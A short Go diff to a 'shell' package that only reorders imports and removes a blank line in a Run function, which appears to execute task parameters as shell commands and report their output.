@@ -1,10 +1,10 @@
 package shell
 
 import (
+	"encoding/json"
+	"pkg/profiles"
 	"pkg/utils/structs"
 	"sync"
-	"pkg/profiles"
-	"encoding/json"
 )
 
 var mu sync.Mutex
@@ -21,7 +21,6 @@ func Run(task structs.Task) {
 	msg.TaskID = task.TaskID
 	res, err := shellExec(task.Params)
 
-	
 	if err != nil {
 		msg.UserOutput = err.Error() + "\n" + string(res.Response())
 		msg.Completed = true
